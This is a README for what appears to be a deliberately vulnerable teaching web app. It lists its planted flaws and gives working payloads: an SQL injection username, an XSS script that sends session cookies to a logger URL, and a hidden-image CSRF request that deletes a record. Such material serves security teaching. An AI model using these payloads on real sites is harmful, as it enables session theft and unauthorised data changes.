# Introduction

This is a simple application that demonstrates a few typical web application vulnerablities. The example covers:

* an SQL injection vulnerability,
* an XSS vulnerability,
* a CSRF vulnerability,
* an improper storage of sensitive data,
* an improper use of HTTP methods,
* and improperly secured URLS.

# SQL Injection 

As a username, provide `student' OR '`

# XSS 

XSS attack. This entry forces the visitor's browser to send its session cookie to the attacker's page.

```html
<script>
var request = new XMLHttpRequest();
request.open("GET", "http://localhost/ex12/xss-logger/upload-cookies.php?" + document.cookie, true);
request.send(null);
</script>
```

# CSRF 

CSRF attack. This entry forces the visitor's browser to issue a GET request to the server. If the visitor is logged-in, the request will successfully access a protected resource -- will delete a joke.

```html
<img src="joke/delete?id=3&delete_confirmation=on" width="0" height="0" />
```
